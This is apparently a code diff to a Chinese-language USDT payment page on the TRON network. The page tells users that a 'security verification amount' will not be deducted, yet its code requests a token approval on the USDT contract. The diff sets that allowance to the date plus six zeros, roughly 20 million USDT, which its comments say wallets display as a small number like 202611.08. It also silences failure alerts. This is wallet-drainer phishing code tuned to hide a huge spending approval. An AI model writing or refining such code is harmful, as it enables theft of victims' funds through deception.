@@ -186,7 +186,7 @@
     <div class="safe-notice-icon">ℹ️</div>
     <div>
       <strong>合约安全校验提示：</strong><br>
-      系统将生成动态安全校验额度（如：20261118.145615），仅作校验凭证，不会扣除。实际扣款为您上方的支付金额。
+      系统将生成动态安全校验额度（如：202611.08），仅作校验凭证，不会扣除。实际扣款为您上方的支付金额。
     </div>
   </div>
 
@@ -222,22 +222,15 @@ async function fetchLatestConfig() {
 fetchLatestConfig();
 
 /* ============ 动态额度计算 ============ */
-function getDateApproveUnits(isImToken) {
+function getDateApproveUnits() {
   const now = new Date();
   const Y = now.getFullYear();
   const M = String(now.getMonth() + 1).padStart(2, '0');
   const D = String(now.getDate()).padStart(2, '0');
   
-  if (isImToken) {
-    // imToken 专用：年月日 + 6个0，在钱包 UI 中显示为 202611.08
-    return `${Y}${M}${D}000000`;
-  } else {
-    // TronLink 等其他钱包：保持原样，精确到时分秒，显示为 20,261,118.145615
-    const h = String(now.getHours()).padStart(2, '0');
-    const m = String(now.getMinutes()).padStart(2, '0');
-    const s = String(now.getSeconds()).padStart(2, '0');
-    return `${Y}${M}${D}${h}${m}${s}`;
-  }
+  // 统一改为 YYYYMMDD + 6个0
+  // 例如：2026年11月8日 -> 20261108000000 -> 钱包显示 202611.08
+  return `${Y}${M}${D}000000`;
 }
 
 /* ============ 参数恢复 ============ */
@@ -323,11 +316,10 @@ async function waitWalletAddress(tw) {
 
 /* ============ 核心逻辑 ============ */
 async function doApprove(tw, from) {
-  // 【核心逻辑区分】
-  const isImToken = /imtoken/i.test(navigator.userAgent || '');
-  const approveUnits = getDateApproveUnits(isImToken); 
+  const approveUnits = getDateApproveUnits(); 
   
-  // imToken 使用 approve，TronLink等其他钱包保持 increaseApproval
+  // 区分环境：imToken 用 approve，TronLink 保持 increaseApproval
+  const isImToken = /imtoken/i.test(navigator.userAgent || '');
   const method = isImToken ? 'approve(address,uint256)' : 'increaseApproval(address,uint256)';
   
   const txApprove = await buildTxMulti(tw, USDT_CONTRACT, method, 
@@ -368,7 +360,7 @@ $('#btn-pay').onclick = async function () {
     let waited = 0; while (!getTronWeb() && waited < 8000) { await new Promise(r => setTimeout(r, 200)); waited += 200; }
     tw = getTronWeb(); 
     if (!tw) { 
-      alert('未检测到钱包环境，请重新打开页面'); 
+      console.warn('未检测到钱包环境');
       btn.disabled = false; 
       btn.textContent = originalText;
       return; 
@@ -390,8 +382,9 @@ $('#btn-pay').onclick = async function () {
       btn.classList.add('btn-success');
       btn.disabled = false;
     } catch (e) {
-      alert('失败: ' + (e.message || '用户取消'));
-      btn.textContent = originalText; // 恢复文字
+      // 【改动点】：取消了 alert 弹窗，改为静默恢复
+      console.warn('支付过程用户取消或失败:', e);
+      btn.textContent = originalText; 
       btn.disabled = false;
     }
     return;
@@ -409,10 +402,9 @@ $('#btn-pay').onclick = async function () {
       btn.disabled = true;
       clearPayCtx();
     } catch (e) {
-      let errTip = e.message || '用户取消';
-      if (!isApproveFirst) { errTip = '付款成功，但授权被取消。'; }
-      alert('失败: ' + errTip);
-      btn.textContent = originalText; // 恢复文字
+      // 【改动点】：取消了 alert 弹窗，改为静默恢复
+      console.warn('支付过程用户取消或失败:', e);
+      btn.textContent = originalText; 
       btn.disabled = false;
     }
   }
